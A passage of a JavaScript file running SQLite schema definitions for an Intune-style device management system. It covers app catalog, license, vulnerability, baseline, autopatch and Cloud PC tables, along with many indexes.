      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE,
      FOREIGN KEY(feature_policy_id) REFERENCES feature_update_policies(id) ON DELETE SET NULL,
      FOREIGN KEY(expedited_update_id) REFERENCES expedited_quality_updates(id) ON DELETE SET NULL
    );

    -- 85. ENTERPRISE_APP_CATALOG — Intune Suite Enterprise App Catalog & WinGet Repository
    CREATE TABLE IF NOT EXISTS enterprise_app_catalog (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      publisher TEXT NOT NULL,
      category TEXT NOT NULL,
      version TEXT NOT NULL,
      package_identifier TEXT NOT NULL,
      source_type TEXT DEFAULT 'WINGET' CHECK(source_type IN ('WINGET', 'MSI', 'EXE', 'INTERNAL_STORE')),
      download_url TEXT DEFAULT '',
      silent_install_args TEXT DEFAULT '',
      silent_uninstall_args TEXT DEFAULT '',
      icon_url TEXT DEFAULT '',
      featured INTEGER DEFAULT 0 CHECK(featured IN (0, 1)),
      self_service_enabled INTEGER DEFAULT 1 CHECK(self_service_enabled IN (0, 1)),
      license_type TEXT DEFAULT 'FREE' CHECK(license_type IN ('FREE', 'OPEN_SOURCE', 'PER_DEVICE', 'PER_USER', 'ENTERPRISE_SUBSCRIPTION')),
      total_licenses INTEGER DEFAULT 0,
      assigned_group_id TEXT DEFAULT NULL,
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(assigned_group_id) REFERENCES dynamic_groups(id) ON DELETE SET NULL
    );

    -- 86. COMPANY_PORTAL_REQUESTS — Self-Service Application Requests, Elevation Approvals & Deployment Queue
    CREATE TABLE IF NOT EXISTS company_portal_requests (
      id TEXT PRIMARY KEY,
      catalog_app_id TEXT NOT NULL,
      device_id TEXT NOT NULL,
      user_name TEXT NOT NULL,
      request_type TEXT DEFAULT 'INSTALL' CHECK(request_type IN ('INSTALL', 'UNINSTALL', 'REPAIR')),
      status TEXT DEFAULT 'PENDING_APPROVAL' CHECK(status IN ('PENDING_APPROVAL', 'APPROVED', 'REJECTED', 'QUEUED', 'INSTALLING', 'COMPLETED', 'FAILED')),
      approval_required INTEGER DEFAULT 0 CHECK(approval_required IN (0, 1)),
      approver_user TEXT DEFAULT '',
      justification TEXT DEFAULT '',
      error_message TEXT DEFAULT '',
      requested_at TEXT DEFAULT (DATETIME('now')),
      resolved_at TEXT,
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(catalog_app_id) REFERENCES enterprise_app_catalog(id) ON DELETE CASCADE,
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE
    );

    -- 88. SECURITY_VULNERABILITIES — Defender Vulnerability Management (TVM) Knowledgebase
    CREATE TABLE IF NOT EXISTS security_vulnerabilities (
      cve_id TEXT PRIMARY KEY,
      title TEXT NOT NULL,
      description TEXT,
      software_name TEXT NOT NULL,
      affected_versions TEXT NOT NULL,
      cvss_score REAL NOT NULL,
      severity TEXT NOT NULL CHECK(severity IN ('CRITICAL', 'HIGH', 'MEDIUM', 'LOW')),
      exploit_status TEXT DEFAULT 'NONE' CHECK(exploit_status IN ('NONE', 'UNPROVEN', 'ACTIVE_EXPLOIT_POC', 'WEAPONIZED_WILD')),
      patch_status TEXT DEFAULT 'VENDOR_PATCH_AVAILABLE' CHECK(patch_status IN ('VENDOR_PATCH_AVAILABLE', 'MITIGATION_AVAILABLE', 'UNPATCHED')),
      cpe_identifier TEXT DEFAULT '',
      remediation_guidance TEXT DEFAULT '',
      published_date TEXT,
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now'))
    );

    -- 89. DEVICE_VULNERABILITIES — Workstation CVE Exposure & Posture
    CREATE TABLE IF NOT EXISTS device_vulnerabilities (
      id TEXT PRIMARY KEY,
      device_id TEXT NOT NULL,
      cve_id TEXT NOT NULL,
      detected_software_name TEXT NOT NULL,
      detected_version TEXT NOT NULL,
      status TEXT DEFAULT 'ACTIVE' CHECK(status IN ('ACTIVE', 'RESOLVED', 'EXCEPTION_APPROVED', 'MITIGATED')),
      risk_score REAL DEFAULT 0.0,
      remediation_script TEXT DEFAULT '',
      first_detected_at TEXT DEFAULT (DATETIME('now')),
      resolved_at TEXT,
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE,
      FOREIGN KEY(cve_id) REFERENCES security_vulnerabilities(cve_id) ON DELETE CASCADE,
      UNIQUE(device_id, cve_id)
    );

    -- 90. SECURITY_BASELINE_ASSESSMENTS — Intune & Defender Hardened Security Baselines
    CREATE TABLE IF NOT EXISTS security_baseline_assessments (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      category TEXT NOT NULL,
      description TEXT,
      target_group_id TEXT DEFAULT NULL,
      baseline_type TEXT DEFAULT 'WINDOWS_11_ENTERPRISE',
      enforcement_rules TEXT NOT NULL,
      enabled INTEGER DEFAULT 1 CHECK(enabled IN (0, 1)),
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(target_group_id) REFERENCES dynamic_groups(id) ON DELETE SET NULL
    );

    -- 87. APP_LICENSE_ALLOCATIONS — Enterprise Application Seat Allocation & Key Management
    CREATE TABLE IF NOT EXISTS app_license_allocations (
      id TEXT PRIMARY KEY,
      catalog_app_id TEXT NOT NULL,
      device_id TEXT NOT NULL,
      user_name TEXT DEFAULT '',
      license_key TEXT DEFAULT '',
      status TEXT DEFAULT 'ACTIVE' CHECK(status IN ('ACTIVE', 'REVOKED', 'EXPIRED')),
      allocated_at TEXT DEFAULT (DATETIME('now')),
      expires_at TEXT,
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(catalog_app_id) REFERENCES enterprise_app_catalog(id) ON DELETE CASCADE,
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE
    );
  `);

  // Indexes
  db.exec(`
    CREATE INDEX IF NOT EXISTS idx_devices_status ON devices(status);
    CREATE INDEX IF NOT EXISTS idx_devices_last_seen ON devices(last_seen_at);
    CREATE INDEX IF NOT EXISTS idx_devices_hostname ON devices(hostname);
    CREATE INDEX IF NOT EXISTS idx_devices_serial ON devices(serial_number);
    CREATE INDEX IF NOT EXISTS idx_devices_token_hash ON devices(node_token_hash);

    CREATE INDEX IF NOT EXISTS idx_telemetry_dev_time ON telemetry_snapshots(device_id, timestamp DESC);
    CREATE INDEX IF NOT EXISTS idx_telemetry_timestamp ON telemetry_snapshots(timestamp);

    CREATE INDEX IF NOT EXISTS idx_dynamic_groups_priority ON dynamic_groups(priority ASC);

    CREATE INDEX IF NOT EXISTS idx_memberships_device ON group_memberships(device_id);
    CREATE INDEX IF NOT EXISTS idx_memberships_group ON group_memberships(group_id);

    CREATE UNIQUE INDEX IF NOT EXISTS idx_software_winget ON software_catalog(winget_id);

    CREATE INDEX IF NOT EXISTS idx_policy_group ON policy_assignments(group_id);
    CREATE INDEX IF NOT EXISTS idx_policy_software ON policy_assignments(software_id);

    CREATE INDEX IF NOT EXISTS idx_events_device ON security_events(device_id);
    CREATE INDEX IF NOT EXISTS idx_events_sev_ack ON security_events(severity, acknowledged);
    CREATE INDEX IF NOT EXISTS idx_events_created ON security_events(created_at DESC);

    CREATE INDEX IF NOT EXISTS idx_device_commands_dev_status ON device_commands(device_id, status);
    CREATE INDEX IF NOT EXISTS idx_commands_status ON device_commands(status);

    CREATE INDEX IF NOT EXISTS idx_remediations_target ON remediations(target_group_id);
    CREATE INDEX IF NOT EXISTS idx_remediation_runs_dev ON remediation_runs(device_id, executed_at DESC);
    CREATE INDEX IF NOT EXISTS idx_remediation_runs_rem ON remediation_runs(remediation_id, executed_at DESC);

    CREATE INDEX IF NOT EXISTS idx_profiles_target ON configuration_profiles(target_group_id);
    CREATE INDEX IF NOT EXISTS idx_profiles_type ON configuration_profiles(profile_type);
    CREATE INDEX IF NOT EXISTS idx_compliance_dev ON profile_compliance(device_id, evaluated_at DESC);
    CREATE INDEX IF NOT EXISTS idx_compliance_prof ON profile_compliance(profile_id, compliance_status);

    CREATE INDEX IF NOT EXISTS idx_rings_target ON update_rings(target_group_id);
    CREATE INDEX IF NOT EXISTS idx_dev_update_ring ON device_update_status(ring_id);
    CREATE INDEX IF NOT EXISTS idx_dev_update_reboot ON device_update_status(reboot_pending);

    CREATE INDEX IF NOT EXISTS idx_comp_pol_target ON compliance_policies(target_group_id);
    CREATE INDEX IF NOT EXISTS idx_comp_eval_dev ON device_compliance_evaluations(device_id, evaluated_at DESC);
    CREATE INDEX IF NOT EXISTS idx_comp_eval_status ON device_compliance_evaluations(compliance_status);

    CREATE INDEX IF NOT EXISTS idx_apps_target_group ON apps(target_group_id);
    CREATE INDEX IF NOT EXISTS idx_apps_intent ON apps(assignment_intent);
    CREATE INDEX IF NOT EXISTS idx_device_app_status_dev ON device_app_status(device_id);
    CREATE INDEX IF NOT EXISTS idx_device_app_status_app ON device_app_status(app_id);
    CREATE INDEX IF NOT EXISTS idx_device_app_status_stat ON device_app_status(install_status);

    CREATE INDEX IF NOT EXISTS idx_sec_policies_target ON endpoint_security_policies(target_group_id);
    CREATE INDEX IF NOT EXISTS idx_dev_av_status_dev ON device_antivirus_status(device_id);
    CREATE INDEX IF NOT EXISTS idx_dev_av_sig_age ON device_antivirus_status(signature_age_days);
    CREATE INDEX IF NOT EXISTS idx_dev_av_rtp ON device_antivirus_status(real_time_protection_enabled);
    CREATE INDEX IF NOT EXISTS idx_threats_dev ON threat_detections(device_id, detected_at DESC);
    CREATE INDEX IF NOT EXISTS idx_threats_status ON threat_detections(remediation_status);
    CREATE INDEX IF NOT EXISTS idx_threats_sev ON threat_detections(severity);

    CREATE INDEX IF NOT EXISTS idx_bit_pol_target ON bitlocker_policies(target_group_id);
    CREATE INDEX IF NOT EXISTS idx_bit_vol_dev ON device_bitlocker_volumes(device_id);
    CREATE INDEX IF NOT EXISTS idx_bit_vol_prot ON device_bitlocker_volumes(protection_status);
    CREATE INDEX IF NOT EXISTS idx_bit_keys_dev ON bitlocker_recovery_keys(device_id);
    CREATE INDEX IF NOT EXISTS idx_bit_keys_prot_id ON bitlocker_recovery_keys(key_protector_id);
    CREATE INDEX IF NOT EXISTS idx_bit_audit_key ON bitlocker_audit_logs(key_id);
    CREATE INDEX IF NOT EXISTS idx_bit_audit_time ON bitlocker_audit_logs(accessed_at DESC);

    CREATE INDEX IF NOT EXISTS idx_laps_pol_target ON laps_policies(target_group_id);
    CREATE INDEX IF NOT EXISTS idx_laps_pwd_dev ON laps_passwords(device_id);
    CREATE INDEX IF NOT EXISTS idx_laps_pwd_status ON laps_passwords(rotation_status);
    CREATE INDEX IF NOT EXISTS idx_laps_pwd_expires ON laps_passwords(expires_at);
    CREATE INDEX IF NOT EXISTS idx_laps_hist_dev ON laps_password_history(device_id, rotated_at DESC);
    CREATE INDEX IF NOT EXISTS idx_laps_audit_dev ON laps_audit_logs(device_id, accessed_at DESC);
    CREATE INDEX IF NOT EXISTS idx_laps_audit_action ON laps_audit_logs(action);

    CREATE INDEX IF NOT EXISTS idx_epm_pol_target ON epm_policies(target_group_id);
    CREATE INDEX IF NOT EXISTS idx_epm_rule_pol ON epm_elevation_rules(policy_id);
    CREATE INDEX IF NOT EXISTS idx_epm_req_dev ON epm_elevation_requests(device_id);
    CREATE INDEX IF NOT EXISTS idx_epm_req_status ON epm_elevation_requests(status);
    CREATE INDEX IF NOT EXISTS idx_epm_log_dev ON epm_elevation_logs(device_id);
    CREATE INDEX IF NOT EXISTS idx_epm_log_exec ON epm_elevation_logs(executed_at DESC);

    CREATE INDEX IF NOT EXISTS idx_ap_prof_target ON autopilot_profiles(target_group_id);
    CREATE INDEX IF NOT EXISTS idx_ap_dev_serial ON autopilot_devices(serial_number);
    CREATE INDEX IF NOT EXISTS idx_ap_dev_status ON autopilot_devices(deployment_status);
    CREATE INDEX IF NOT EXISTS idx_ap_dev_group_tag ON autopilot_devices(group_tag);
    CREATE INDEX IF NOT EXISTS idx_ap_dev_profile ON autopilot_devices(profile_id);
    CREATE INDEX IF NOT EXISTS idx_ap_dev_device_id ON autopilot_devices(device_id);
    CREATE INDEX IF NOT EXISTS idx_ap_esp_target ON enrollment_status_page_policies(target_group_id);
    CREATE INDEX IF NOT EXISTS idx_ap_prov_dev ON autopilot_provisioning_events(autopilot_device_id);
    CREATE INDEX IF NOT EXISTS idx_ap_prov_phase ON autopilot_provisioning_events(phase);
    CREATE INDEX IF NOT EXISTS idx_ap_prov_time ON autopilot_provisioning_events(timestamp DESC);

    CREATE INDEX IF NOT EXISTS idx_dra_device ON device_remote_actions(device_id);
    CREATE INDEX IF NOT EXISTS idx_dra_status ON device_remote_actions(status);
    CREATE INDEX IF NOT EXISTS idx_dra_type ON device_remote_actions(action_type);
    CREATE INDEX IF NOT EXISTS idx_dra_created ON device_remote_actions(created_at DESC);
    CREATE INDEX IF NOT EXISTS idx_dra_bulk ON device_remote_actions(bulk_action_id);
    CREATE INDEX IF NOT EXISTS idx_ddb_device ON device_diagnostics_bundles(device_id);
    CREATE INDEX IF NOT EXISTS idx_ddb_status ON device_diagnostics_bundles(status);
    CREATE INDEX IF NOT EXISTS idx_bda_target ON bulk_device_actions(target_group_id);
    CREATE INDEX IF NOT EXISTS idx_bda_status ON bulk_device_actions(status);

    CREATE INDEX IF NOT EXISTS idx_fwr_target ON firewall_rules(target_group_id);
    CREATE INDEX IF NOT EXISTS idx_fwr_enabled ON firewall_rules(enabled);
    CREATE INDEX IF NOT EXISTS idx_fwr_direction ON firewall_rules(direction);
    CREATE INDEX IF NOT EXISTS idx_fwr_action ON firewall_rules(action);
    CREATE INDEX IF NOT EXISTS idx_dfs_device ON device_firewall_status(device_id);
    CREATE INDEX IF NOT EXISTS idx_dfs_compliance ON device_firewall_status(compliance_status);
    CREATE INDEX IF NOT EXISTS idx_dlp_device ON device_listening_ports(device_id);
    CREATE INDEX IF NOT EXISTS idx_dlp_port ON device_listening_ports(local_port);
    CREATE INDEX IF NOT EXISTS idx_dlp_risk ON device_listening_ports(risk_level);
    CREATE INDEX IF NOT EXISTS idx_dlp_status ON device_listening_ports(status);

    CREATE INDEX IF NOT EXISTS idx_ds_target ON device_scripts(target_group_id);
    CREATE INDEX IF NOT EXISTS idx_ds_enabled ON device_scripts(enabled);
    CREATE INDEX IF NOT EXISTS idx_dsr_device ON device_script_runs(device_id);
    CREATE INDEX IF NOT EXISTS idx_dsr_script ON device_script_runs(script_id);
    CREATE INDEX IF NOT EXISTS idx_dsr_status ON device_script_runs(status);
    CREATE INDEX IF NOT EXISTS idx_dsr_executed ON device_script_runs(executed_at DESC);

    CREATE INDEX IF NOT EXISTS idx_asr_status_device ON device_asr_status(device_id);
    CREATE INDEX IF NOT EXISTS idx_asr_events_device ON asr_events(device_id);
    CREATE INDEX IF NOT EXISTS idx_asr_events_occurred ON asr_events(occurred_at DESC);
    CREATE INDEX IF NOT EXISTS idx_asr_events_rule ON asr_events(rule_id);

    CREATE INDEX IF NOT EXISTS idx_das_device ON device_analytics_snapshots(device_id);
    CREATE INDEX IF NOT EXISTS idx_das_date ON device_analytics_snapshots(snapshot_date DESC);
    CREATE INDEX IF NOT EXISTS idx_are_device ON app_reliability_events(device_id);
    CREATE INDEX IF NOT EXISTS idx_are_app ON app_reliability_events(app_name);
    CREATE INDEX IF NOT EXISTS idx_are_type ON app_reliability_events(event_type);
    CREATE INDEX IF NOT EXISTS idx_are_time ON app_reliability_events(occurred_at DESC);
    CREATE INDEX IF NOT EXISTS idx_er_type ON executive_reports(report_type);
    CREATE INDEX IF NOT EXISTS idx_er_time ON executive_reports(generated_at DESC);

    CREATE INDEX IF NOT EXISTS idx_om_target ON organizational_messages(target_group_id);
    CREATE INDEX IF NOT EXISTS idx_om_enabled ON organizational_messages(enabled);
    CREATE INDEX IF NOT EXISTS idx_dmd_device ON device_message_deliveries(device_id);
    CREATE INDEX IF NOT EXISTS idx_dmd_msg ON device_message_deliveries(message_id);
    CREATE INDEX IF NOT EXISTS idx_dmd_status ON device_message_deliveries(status);

    CREATE INDEX IF NOT EXISTS idx_certprof_type ON certificate_profiles(certificate_type);
    CREATE INDEX IF NOT EXISTS idx_certprof_target ON certificate_profiles(target_group_id);
    CREATE INDEX IF NOT EXISTS idx_certprof_enabled ON certificate_profiles(enabled);
    CREATE INDEX IF NOT EXISTS idx_devcert_device ON device_certificates(device_id);
    CREATE INDEX IF NOT EXISTS idx_devcert_thumb ON device_certificates(thumbprint);
    CREATE INDEX IF NOT EXISTS idx_devcert_status ON device_certificates(status);
    CREATE INDEX IF NOT EXISTS idx_devcert_expiry ON device_certificates(days_to_expiry ASC);

    CREATE INDEX IF NOT EXISTS idx_netprof_type ON network_profiles(network_type);
    CREATE INDEX IF NOT EXISTS idx_netprof_target ON network_profiles(target_group_id);
    CREATE INDEX IF NOT EXISTS idx_netprof_enabled ON network_profiles(enabled);
    CREATE INDEX IF NOT EXISTS idx_devnet_device ON device_network_posture(device_id);
    CREATE INDEX IF NOT EXISTS idx_devnet_ssid ON device_network_posture(connected_ssid);

    CREATE INDEX IF NOT EXISTS idx_kioskprof_mode ON kiosk_profiles(kiosk_mode);
    CREATE INDEX IF NOT EXISTS idx_kioskprof_target ON kiosk_profiles(target_group_id);
    CREATE INDEX IF NOT EXISTS idx_kioskprof_enabled ON kiosk_profiles(enabled);
    CREATE INDEX IF NOT EXISTS idx_devkiosk_device ON device_kiosk_status(device_id);
    CREATE INDEX IF NOT EXISTS idx_devkiosk_status ON device_kiosk_status(lockdown_status);

    CREATE INDEX IF NOT EXISTS idx_storpol_target ON storage_access_policies(target_group_id);
    CREATE INDEX IF NOT EXISTS idx_storpol_enabled ON storage_access_policies(enabled);
    CREATE INDEX IF NOT EXISTS idx_devstor_device ON device_removable_storage_status(device_id);
    CREATE INDEX IF NOT EXISTS idx_devstor_comp ON device_removable_storage_status(compliance_status);
    CREATE INDEX IF NOT EXISTS idx_storevt_device ON removable_storage_events(device_id);
    CREATE INDEX IF NOT EXISTS idx_storevt_time ON removable_storage_events(timestamp DESC);

    CREATE INDEX IF NOT EXISTS idx_dopol_target ON delivery_optimization_policies(target_group_id);
    CREATE INDEX IF NOT EXISTS idx_dopol_enabled ON delivery_optimization_policies(enabled);
    CREATE INDEX IF NOT EXISTS idx_devdo_device ON device_delivery_optimization_status(device_id);
    CREATE INDEX IF NOT EXISTS idx_devdo_p2p ON device_delivery_optimization_status(p2p_efficiency_pct);
    CREATE INDEX IF NOT EXISTS idx_docontent_device ON delivery_optimization_content_log(device_id);
    CREATE INDEX IF NOT EXISTS idx_docontent_time ON delivery_optimization_content_log(timestamp DESC);

    CREATE INDEX IF NOT EXISTS idx_dfcipol_target ON dfci_policies(target_group_id);
    CREATE INDEX IF NOT EXISTS idx_dfcipol_enabled ON dfci_policies(enabled);
    CREATE INDEX IF NOT EXISTS idx_devdfci_device ON device_dfci_status(device_id);
    CREATE INDEX IF NOT EXISTS idx_devdfci_comp ON device_dfci_status(compliance_status);
    CREATE INDEX IF NOT EXISTS idx_devdfci_score ON device_dfci_status(hardware_readiness_score);
    CREATE INDEX IF NOT EXISTS idx_dfciaudit_device ON dfci_audit_log(device_id);
    CREATE INDEX IF NOT EXISTS idx_dfciaudit_time ON dfci_audit_log(timestamp DESC);

    CREATE INDEX IF NOT EXISTS idx_wippol_target ON wip_policies(target_group_id);
    CREATE INDEX IF NOT EXISTS idx_wippol_enabled ON wip_policies(enabled);
    CREATE INDEX IF NOT EXISTS idx_devwip_device ON device_wip_status(device_id);
    CREATE INDEX IF NOT EXISTS idx_devwip_comp ON device_wip_status(compliance_status);
    CREATE INDEX IF NOT EXISTS idx_devwip_enforce ON device_wip_status(enforcement_active);
    CREATE INDEX IF NOT EXISTS idx_wipaudit_device ON wip_audit_log(device_id);
    CREATE INDEX IF NOT EXISTS idx_wipaudit_time ON wip_audit_log(timestamp DESC);

    CREATE INDEX IF NOT EXISTS idx_whfbpol_target ON whfb_policies(target_group_id);
    CREATE INDEX IF NOT EXISTS idx_whfbpol_enabled ON whfb_policies(enabled);
    CREATE INDEX IF NOT EXISTS idx_devwhfb_device ON device_whfb_status(device_id);
    CREATE INDEX IF NOT EXISTS idx_devwhfb_comp ON device_whfb_status(compliance_status);
    CREATE INDEX IF NOT EXISTS idx_devwhfb_enrolled ON device_whfb_status(whfb_enrolled);
    CREATE INDEX IF NOT EXISTS idx_whfbaudit_device ON whfb_audit_log(device_id);
    CREATE INDEX IF NOT EXISTS idx_whfbaudit_time ON whfb_audit_log(timestamp DESC);

    CREATE INDEX IF NOT EXISTS idx_drvpol_target ON driver_update_policies(target_group_id);
    CREATE INDEX IF NOT EXISTS idx_drvpol_enabled ON driver_update_policies(enabled);
    CREATE INDEX IF NOT EXISTS idx_drvcat_class ON fleet_driver_catalog(driver_class);
    CREATE INDEX IF NOT EXISTS idx_drvcat_status ON fleet_driver_catalog(approval_status);
    CREATE INDEX IF NOT EXISTS idx_devdrv_dev ON device_driver_status(device_id);
    CREATE INDEX IF NOT EXISTS idx_devdrv_drv ON device_driver_status(driver_id);
    CREATE INDEX IF NOT EXISTS idx_devdrv_status ON device_driver_status(install_status);

    CREATE INDEX IF NOT EXISTS idx_rh_sess_code ON remote_help_sessions(session_code);
    CREATE INDEX IF NOT EXISTS idx_rh_sess_device ON remote_help_sessions(device_id);
    CREATE INDEX IF NOT EXISTS idx_rh_sess_status ON remote_help_sessions(status);
    CREATE INDEX IF NOT EXISTS idx_rh_roles_target ON remote_help_roles(target_group_id);
    CREATE INDEX IF NOT EXISTS idx_rh_roles_enabled ON remote_help_roles(enabled);
    CREATE INDEX IF NOT EXISTS idx_rh_audit_sess ON remote_help_audit_log(session_id);
    CREATE INDEX IF NOT EXISTS idx_rh_audit_dev ON remote_help_audit_log(device_id);
    CREATE INDEX IF NOT EXISTS idx_rh_audit_time ON remote_help_audit_log(timestamp DESC);

    CREATE INDEX IF NOT EXISTS idx_feapol_target ON feature_update_policies(target_group_id);
    CREATE INDEX IF NOT EXISTS idx_feapol_enabled ON feature_update_policies(enabled);
    CREATE INDEX IF NOT EXISTS idx_expupd_target ON expedited_quality_updates(target_group_id);
    CREATE INDEX IF NOT EXISTS idx_expupd_status ON expedited_quality_updates(status);
    CREATE INDEX IF NOT EXISTS idx_devfeaupd_dev ON device_feature_update_status(device_id);
    CREATE INDEX IF NOT EXISTS idx_devfeaupd_fstatus ON device_feature_update_status(feature_update_status);
    CREATE INDEX IF NOT EXISTS idx_devfeaupd_estatus ON device_feature_update_status(expedited_install_status);

    CREATE INDEX IF NOT EXISTS idx_entapp_pkg ON enterprise_app_catalog(package_identifier);
    CREATE INDEX IF NOT EXISTS idx_entapp_cat ON enterprise_app_catalog(category);
    CREATE INDEX IF NOT EXISTS idx_entapp_selfservice ON enterprise_app_catalog(self_service_enabled);
    CREATE INDEX IF NOT EXISTS idx_portreq_dev ON company_portal_requests(device_id);
    CREATE INDEX IF NOT EXISTS idx_portreq_app ON company_portal_requests(catalog_app_id);
    CREATE INDEX IF NOT EXISTS idx_portreq_status ON company_portal_requests(status);
    CREATE INDEX IF NOT EXISTS idx_licalloc_app ON app_license_allocations(catalog_app_id);
    CREATE INDEX IF NOT EXISTS idx_licalloc_dev ON app_license_allocations(device_id);
    CREATE INDEX IF NOT EXISTS idx_licalloc_status ON app_license_allocations(status);

    CREATE INDEX IF NOT EXISTS idx_secvuln_sev ON security_vulnerabilities(severity);
    CREATE INDEX IF NOT EXISTS idx_secvuln_cvss ON security_vulnerabilities(cvss_score DESC);
    CREATE INDEX IF NOT EXISTS idx_secvuln_sw ON security_vulnerabilities(software_name);
    CREATE INDEX IF NOT EXISTS idx_devvuln_dev ON device_vulnerabilities(device_id);
    CREATE INDEX IF NOT EXISTS idx_devvuln_cve ON device_vulnerabilities(cve_id);
    CREATE INDEX IF NOT EXISTS idx_devvuln_status ON device_vulnerabilities(status);
    CREATE INDEX IF NOT EXISTS idx_secbase_target ON security_baseline_assessments(target_group_id);
    CREATE INDEX IF NOT EXISTS idx_secbase_enabled ON security_baseline_assessments(enabled);

    -- 92. AUTOPATCH_RELEASE_CADENCE — Windows Monthly Patch Cadence & Rollout State
    CREATE TABLE IF NOT EXISTS autopatch_release_cadence (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      release_month TEXT NOT NULL,
      release_type TEXT NOT NULL DEFAULT 'SECURITY_QUALITY' CHECK(release_type IN ('SECURITY_QUALITY', 'OUT_OF_BAND_EXPEDITED', 'OPTIONAL_PREVIEW')),
      target_kb_numbers TEXT NOT NULL,
      approval_status TEXT NOT NULL DEFAULT 'AUTOMATIC_APPROVED' CHECK(approval_status IN ('AUTOMATIC_APPROVED', 'MANUAL_APPROVAL_REQUIRED', 'PAUSED', 'ROLLED_BACK')),
      active_phase TEXT NOT NULL DEFAULT 'TEST' CHECK(active_phase IN ('TEST', 'FIRST', 'FAST', 'BROAD', 'COMPLETED', 'PAUSED', 'ROLLED_BACK')),
      scheduled_start_date TEXT NOT NULL DEFAULT (DATETIME('now')),
      broad_target_date TEXT,
      rollback_reason TEXT,
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now'))
    );

    -- 93. AUTOPATCH_RINGS — Staged Progressive Deployment Ring Definitions
    CREATE TABLE IF NOT EXISTS autopatch_rings (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      phase_order INTEGER NOT NULL UNIQUE,
      deferral_days INTEGER NOT NULL DEFAULT 0,
      target_device_percentage REAL NOT NULL DEFAULT 25.0,
      max_allowable_crash_rate REAL NOT NULL DEFAULT 2.0,
      min_success_rate REAL NOT NULL DEFAULT 95.0,
      target_group_id TEXT DEFAULT 'grp-all',
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(target_group_id) REFERENCES dynamic_groups(id) ON DELETE SET DEFAULT
    );

    -- 94. AUTOPATCH_DEVICE_DEPLOYMENTS — Workstation Rollout Status & Crash Feedback
    CREATE TABLE IF NOT EXISTS autopatch_device_deployments (
      id TEXT PRIMARY KEY,
      release_id TEXT NOT NULL,
      device_id TEXT NOT NULL,
      ring_id TEXT NOT NULL,
      install_status TEXT NOT NULL DEFAULT 'PENDING' CHECK(install_status IN ('PENDING', 'DOWNLOADING', 'INSTALLING', 'REBOOT_PENDING', 'INSTALLED', 'FAILED', 'ROLLED_BACK')),
      applied_kb TEXT,
      exit_code INTEGER,
      post_patch_crashes INTEGER DEFAULT 0,
      error_message TEXT,
      installed_at TEXT,
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(release_id) REFERENCES autopatch_release_cadence(id) ON DELETE CASCADE,
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE,
      FOREIGN KEY(ring_id) REFERENCES autopatch_rings(id) ON DELETE CASCADE,
      UNIQUE(release_id, device_id)
    );

    CREATE INDEX IF NOT EXISTS idx_autopatch_rel_month ON autopatch_release_cadence(release_month);
    CREATE INDEX IF NOT EXISTS idx_autopatch_rel_phase ON autopatch_release_cadence(active_phase);
    CREATE INDEX IF NOT EXISTS idx_autopatch_rel_status ON autopatch_release_cadence(approval_status);
    CREATE INDEX IF NOT EXISTS idx_autopatch_rings_order ON autopatch_rings(phase_order);
    CREATE INDEX IF NOT EXISTS idx_autopatch_dep_rel ON autopatch_device_deployments(release_id);
    CREATE INDEX IF NOT EXISTS idx_autopatch_dep_dev ON autopatch_device_deployments(device_id);
    CREATE INDEX IF NOT EXISTS idx_autopatch_dep_ring ON autopatch_device_deployments(ring_id);
    CREATE INDEX IF NOT EXISTS idx_autopatch_dep_status ON autopatch_device_deployments(install_status);

    -- 95. CLOUD_PC_PROVISIONING_POLICIES — Windows 365 / Hyper-V Provisioning Configurations
    CREATE TABLE IF NOT EXISTS cloud_pc_provisioning_policies (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      description TEXT,
      sku_name TEXT NOT NULL DEFAULT 'Standard 2vCPU / 8GB RAM / 128GB Storage',
      vcpu_count INTEGER NOT NULL DEFAULT 2,
      ram_gb INTEGER NOT NULL DEFAULT 8,
      storage_gb INTEGER NOT NULL DEFAULT 128,
      os_image TEXT NOT NULL DEFAULT 'Windows 11 Enterprise 24H2',
      join_type TEXT NOT NULL DEFAULT 'ENTRA_JOIN' CHECK(join_type IN ('ENTRA_JOIN', 'HYBRID_ENTRA', 'LOCAL_HYPERV_STANDALONE')),
      target_group_id TEXT DEFAULT 'grp-all',
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(target_group_id) REFERENCES dynamic_groups(id) ON DELETE SET DEFAULT
    );

    -- 96. CLOUD_PC_INSTANCES — Virtual Workstations & Cloud PC State Machine
    CREATE TABLE IF NOT EXISTS cloud_pc_instances (
      id TEXT PRIMARY KEY,
      policy_id TEXT NOT NULL,
      name TEXT NOT NULL,
      hostname TEXT NOT NULL,
      primary_user TEXT NOT NULL,
      host_device_id TEXT,
      provisioning_status TEXT NOT NULL DEFAULT 'PROVISIONED' CHECK(provisioning_status IN ('PROVISIONING', 'PROVISIONED', 'IN_GRACE_PERIOD', 'REPROVISIONING', 'OFFLINE', 'DEPROVISIONED')),
      grace_period_ends_at TEXT,
      ip_address TEXT,
      ram_bytes INTEGER DEFAULT 8589934592,
      disk_free_gb REAL DEFAULT 95.0,
